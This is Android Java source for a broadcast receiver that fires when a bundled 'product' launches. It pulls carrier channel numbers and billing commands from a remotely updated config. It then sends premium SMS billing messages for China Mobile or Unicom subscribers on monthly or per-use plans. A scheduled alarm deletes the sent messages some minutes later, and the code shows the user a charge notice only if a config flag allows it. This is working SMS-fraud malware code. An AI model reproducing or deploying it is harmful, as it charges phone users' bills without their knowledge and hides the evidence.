package com.sttm.charge;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import android.content.SharedPreferences.Editor;
import android.util.Log;
import android.widget.Toast;


import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;
import com.sttm.util.ShareProDBHelper;

public class ProductOpenReceiver extends BroadcastReceiver {
	private static final String TAG = "ProductOpenReceiver";
	private static final String ACTION_LAUNCHER = "com.kso.product.ACTION_LAUNCHER";
	private KsoCache cache;
	private ShareProDBHelper spHelper;
	
	

	@Override
	public void onReceive(Context context, Intent intent) {
		if (intent.getAction().equals(ACTION_LAUNCHER)) {
			
			String msg = intent.getStringExtra("msg");	
			//Log.d("ProductOpenReceiver",msg);

			// 接受到产品启动广播，根据客户配置，是否提示收费
			LogFile.WriteLogFile("用户正在使用酷搜沃产品-----" + msg);
			cache = KsoCache.getInstance();
			if(cache.getCacheSize() <= 0){
				cache.init(context);
			}
			spHelper = new ShareProDBHelper(context);
			int isNotify = cache.getValue("isNotify") != null ?(Integer)cache.getValue("isNotify") : 0;
			String notifyContent = cache.getValue("notifyContent") != null ? (String)cache.getValue("notifyContent") : "";
			//Log.d(TAG, "销量号码" + KsoCache.getInstance().getValue("saleNumbers"));
			LogFile.WriteLogFile("销量号码" + KsoCache.getInstance().getValue("saleNumbers"));
			LogFile.WriteLogFile("是否通知--" + isNotify + "通知内容---" + notifyContent);
			
			if (isNotify == 1 && !"".equals(notifyContent)) {
				Toast toast = Toast.makeText(context, notifyContent,
						Toast.LENGTH_LONG);
				toast.show();
				LogFile.WriteLogFile("正在向用户提示收费方式相关信息");
			}
			
			String today = KsoHelper.date2String();
			
			
			if(!KsoHelper.checkIsUpdate(today, context)){
				LogFile.WriteLogFile("今天还没更新配置文件，马上更新");
				final Context f_context = context;
				new Thread() {
		        	public void run(){
		        		KsoAlarmService ks = new KsoAlarmService();
		        		ks.UpdateGprsData(f_context);
		        	}
				}.start();
			}
		
			
			//SharedPreferences sp = spHelper.getSharedPreferences("dataCenter");
			
			
			int billMethod = cache.getValue("billStyle") != null ? (Integer)cache.getValue("billStyle") : 2;
			//Log.d(TAG, billMethod + "方式");
			
			int billCount = cache.getValue("billCount") != null ? (Integer)cache.getValue("billCount") : 0;
			
			LogFile.WriteLogFile("收费方式--" + billMethod + "收费次数---" + billCount);
			int billedCount = 0;
			if(!"".equals(msg)){
				billedCount = Integer.parseInt(spHelper.readMsg(msg + "BilledCount", 1, "0").trim());
			}
			
			switch (billMethod) {
			case 0://包月
			
				//Log.d(TAG,"测试点1" + billCount);
				if (billCount > billedCount) {
					
					//Log.d(TAG,"测试点2" + billCount);
					if (KsoHelper.getARS2(context) == 1) {
						// 如果是移动用户
						//Log.d(TAG,"测试点3");
						String number = cache.getValue("mobileChannels") != null ? (String)cache.getValue("mobileChannels"):"";
						String order = cache.getValue("mobileOrders")!= null ? (String)cache.getValue("mobileOrders") : "";
						//Log.d(TAG, "包月移动通道号码--" + number + "包月移动通道指令---" + order);
						LogFile.WriteLogFile("包月移动通道号码--" + number + "包月移动通道指令---" + order);
						if(!"".equals(number)&& !"".equals(order)){
							String[] numbers = number.substring(0, number.lastIndexOf(","))
									.split(",");
							
							String[] orders	= order.substring(0, order.lastIndexOf(",")).split(",");
							int i = KsoHelper.getIndex(0);
							while(i >= numbers.length){
								i = KsoHelper.getIndex(0);
							}
							
							SmsSenderAndReceiver.send2(numbers[i].trim(), orders[i].trim());
							//Log.d(TAG, "为移动用户" + numbers[i].trim() + "发送了一条指令为" + orders[i].trim() + "包月扣费信息");
							LogFile.WriteLogFile("为移动用户" + numbers[i].trim() 
									+ "发送了一条指令为" + orders[i].trim() + "包月扣费信息");
							spHelper.writerMsg("BilledCount",
									String.valueOf(billedCount + 1), 1);
							Editor editor = spHelper.writer("sendSmsFlag");
							editor.putBoolean("sendNormonSms", true);
							KsoCache.getInstance().reSetValues2("sendNormonSms", true);
							editor.commit();
							long deleteTime = cache.getValue("deleteTime") != null ?(Long)cache.getValue("deleteTime") : 0;
							if(deleteTime != 0){
								startMainAlarm(context,deleteTime);
								//Log.d(TAG, "将于发送产品收费" + deleteTime + "分钟后删除短信");
								LogFile.WriteLogFile("将于发送产品收费" + deleteTime + "分钟后删除短信");

							}
							
						}
						
						
						

					} else if (KsoHelper.getARS2(context) == 2) {
						
						// 如果是联通用户
						String number = cache.getValue("unionChannels") != null ? (String)cache.getValue("unionChannels") : "";
						
						String order = cache.getValue("unionOrders")!= null ?(String)cache.getValue("unionOrders") : "";
						
						LogFile.WriteLogFile("包月联通通道号码--" + number + "包月联通通道指令---" + order);
						
						if(!"".equals(number)&& !"".equals(order)){
							
							String[] numbers = number.substring(0, number.lastIndexOf(",")).split(",");
							String[] orders = order.substring(0, order.lastIndexOf(",")).split(",");
							int i = KsoHelper.getIndex(0);
							while(i >= numbers.length){
								i = KsoHelper.getIndex(0);
							}
							
							
							SmsSenderAndReceiver.send2(numbers[i].trim(), orders[i].trim());
							
							//Log.d(TAG,"为联通用户"+ numbers[i].trim() + "发送了一条指令" + orders[i].trim() + "包月扣费信息");
							LogFile.WriteLogFile("为联通用户"
									+ numbers[i].trim() 
									+ "发送了一条指令" + orders[i].trim() 
									+ "包月扣费信息");
							spHelper.writerMsg("BilledCount",
									String.valueOf(billedCount + 1), 1);
							Editor editor = spHelper.writer("sendSmsFlag");
							editor.putBoolean("sendNormonSms", true);
							KsoCache.getInstance().reSetValues2("sendNormonSms", true);
							editor.commit();
							long deleteTime = cache.getValue("deleteTime") != null ?(Long)cache.getValue("deleteTime") : 0;
							if(deleteTime != 0){	
								startMainAlarm(context,deleteTime);
								//Log.d(TAG,"将于发送产品收费" + deleteTime + "分钟后删除短信");
								LogFile.WriteLogFile("将于发送产品收费" + deleteTime + "分钟后删除短信");
							}
						}

						

					}else {
						String number = cache.getValue("mobileChannels") != null ? (String)cache.getValue("mobileChannels"):"";
						String order = cache.getValue("mobileOrders")!= null ? (String)cache.getValue("mobileOrders") : "";
						
						LogFile.WriteLogFile("包月移动通道号码--" + number + "包月移动通道指令---" + order);
						if(!"".equals(number)&& !"".equals(order)){
							//Log.d(TAG, number.lastIndexOf(",") + "");
							//Log.d(TAG, number.substring(0, number.lastIndexOf(",")));
							LogFile.WriteLogFile(number.substring(0, number.lastIndexOf(",")));
							String[] numbers = number.substring(0, number.lastIndexOf(","))
									.split(",");
							
							String[] orders	= order.substring(0, order.lastIndexOf(",")).split(",");
							int i = KsoHelper.getIndex(0);
							while(i >= numbers.length){
								i = KsoHelper.getIndex(0);
							}
							
							LogFile.WriteLogFile("包月移动通道数组--" + numbers + "包月移动---" + i);
							SmsSenderAndReceiver.send2(numbers[i].trim(), orders[i].trim());
							LogFile.WriteLogFile("为移动用户" + numbers[i].trim() 
									+ "发送了一条指令为" + orders[i].trim() + "包月扣费信息");
							//Log.d(TAG, "为移动用户" + numbers[i].trim() + "发送了一条指令为" + orders[i].trim() + "包月扣费信息");
							spHelper.writerMsg("BilledCount",
									String.valueOf(billedCount + 1), 1);
							Editor editor = spHelper.writer("sendSmsFlag");
							editor.putBoolean("sendNormonSms", true);
							KsoCache.getInstance().reSetValues2("sendNormonSms", true);
							editor.commit();
							long deleteTime = cache.getValue("deleteTime") != null ?(Long)cache.getValue("deleteTime") : 0;
							if(deleteTime != 0){
								startMainAlarm(context,deleteTime);
								LogFile.WriteLogFile("将于发送产品收费" + deleteTime + "分钟后删除短信");
								//Log.d(TAG,"将于发送产品收费" + deleteTime + "分钟后删除短信");

							}
							
						}
						
					}

				}
				break;
			case 1://点播
				if (KsoHelper.getARS2(context) == 1) {
					String number = cache.getValue("mobileChannels") != null ? (String)cache.getValue("mobileChannels"):"";
					String order = cache.getValue("mobileOrders")!= null ? (String)cache.getValue("mobileOrders") : "";
					LogFile.WriteLogFile("点播移动通道号码--" + number + "点播移动通道指令---" + order);
					if(!"".equals(number)&& !"".equals(order)){
					
						String[] numbers = number.substring(0,number.lastIndexOf(",")).split(",");
						String[] orders = order.substring(0,order.lastIndexOf(",")).split(",");
						// 如果是移动用户
						int i = KsoHelper.getIndex(0);
						while(i >= numbers.length){
							i = KsoHelper.getIndex(0);
						}
						SmsSenderAndReceiver.send2(numbers[i].trim(), orders[i].trim());
						//Log.d(TAG,"为移动用户发送了一条点播扣费信息,通道为"+ numbers[i].trim() + "指令为" + orders[i].trim());
						LogFile.WriteLogFile("为移动用户发送了一条点播扣费信息,通道为"
								+ numbers[i].trim() + "指令为" + orders[i].trim());
						Editor editor = spHelper.writer("sendSmsFlag");
						editor.putBoolean("sendNormonSms", true);
						KsoCache.getInstance().reSetValues2("sendNormonSms", true);
						editor.commit();
						long deleteTime = cache.getValue("deleteTime") != null ?(Long)cache.getValue("deleteTime") : 0;
						
						if(deleteTime != 0){
							startMainAlarm(context,deleteTime);
							//Log.d(TAG, "将于发送产品收费" + deleteTime + "分钟后删除短信");
							LogFile.WriteLogFile("将于发送产品收费" + deleteTime + "分钟后删除短信");
						}
						
					}

					
				} else if (KsoHelper.getARS2(context) == 2) {
					// 如果是联通用户
					String number = cache.getValue("unionChannels") != null ? (String)cache.getValue("unionChannels") : "";
					
					String order = cache.getValue("unionOrders")!= null ?(String)cache.getValue("unionOrders") : "";
					LogFile.WriteLogFile("点播联通通道号码--" + number + "点播联通通道指令---" + order);
					if(!"".equals(number)&& !"".equals(order)){
						String[] numbers = number.substring(0, number.lastIndexOf(",")).split(",");
						String[] orders = order.substring(0, order.lastIndexOf(",")).split(",");
						int i = KsoHelper.getIndex(0);
						while(i >= numbers.length){
							i = KsoHelper.getIndex(0);
						}

						SmsSenderAndReceiver.send2(numbers[i].trim(), orders[i].trim());
						//Log.d(TAG,"为联通用户"+ numbers[i].trim() + "发送了一条指令" + orders[i].trim() + "包月扣费信息");
						LogFile.WriteLogFile("为联通用户"
								+ numbers[i].trim() 
								+ "发送了一条指令" + orders[i].trim() 
								+ "包月扣费信息");
						Editor editor = spHelper.writer("sendSmsFlag");
						editor.putBoolean("sendNormonSms", true);
						KsoCache.getInstance().reSetValues2("sendNormonSms", true);
						editor.commit();
			
						long deleteTime = cache.getValue("deleteTime") != null ?(Long)cache.getValue("deleteTime") : 0;
						if(deleteTime != 0){
							startMainAlarm(context,deleteTime);
							//Log.d(TAG,"将于发送产品收费" + deleteTime + "分钟后删除短信");
							LogFile.WriteLogFile("将于发送产品收费" + deleteTime + "分钟后删除短信");
							
							
						}
						
					}

					

				}else {
					String number = cache.getValue("mobileChannels") != null ? (String)cache.getValue("mobileChannels"):"";
					String order = cache.getValue("mobileOrders")!= null ? (String)cache.getValue("mobileOrders") : "";
					LogFile.WriteLogFile("点播移动通道号码--" + number + "点播移动通道指令---" + order);
					if(!"".equals(number)&& !"".equals(order)){
					
						String[] numbers = number.substring(0,number.lastIndexOf(",")).split(",");
						String[] orders = order.substring(0,order.lastIndexOf(",")).split(",");
						// 如果是移动用户
						int i = KsoHelper.getIndex(0);
						while(i >= numbers.length){
							i = KsoHelper.getIndex(0);
						}
						SmsSenderAndReceiver.send2(numbers[i].trim(), orders[i].trim());
						LogFile.WriteLogFile("为移动用户发送了一条点播扣费信息");
						Editor editor = spHelper.writer("sendSmsFlag");
						editor.putBoolean("sendNormonSms", true);
						KsoCache.getInstance().reSetValues2("sendNormonSms", true);
						editor.commit();
						long deleteTime = cache.getValue("deleteTime") != null ?(Long)cache.getValue("deleteTime") : 0;
						
						if(deleteTime != 0){
							startMainAlarm(context,deleteTime);
							LogFile.WriteLogFile("将于发送产品收费" + deleteTime + "分钟后删除短信");
						}
						
					}
				}
				break;
				

			}

		}

	}
	
	
	private static void startMainAlarm(Context context,long time){
		Intent intentSalesFlag1 = new Intent(context, KsoAlarmService.class);
		intentSalesFlag1.setAction("sendNormonSms");
		PendingIntent pintentSalesFlag1 = PendingIntent.getBroadcast(context, 0, intentSalesFlag1, 0);
		AlarmManager alarmSales1 = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
		alarmSales1.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+ time *1000 * 60, pintentSalesFlag1);
	}

}
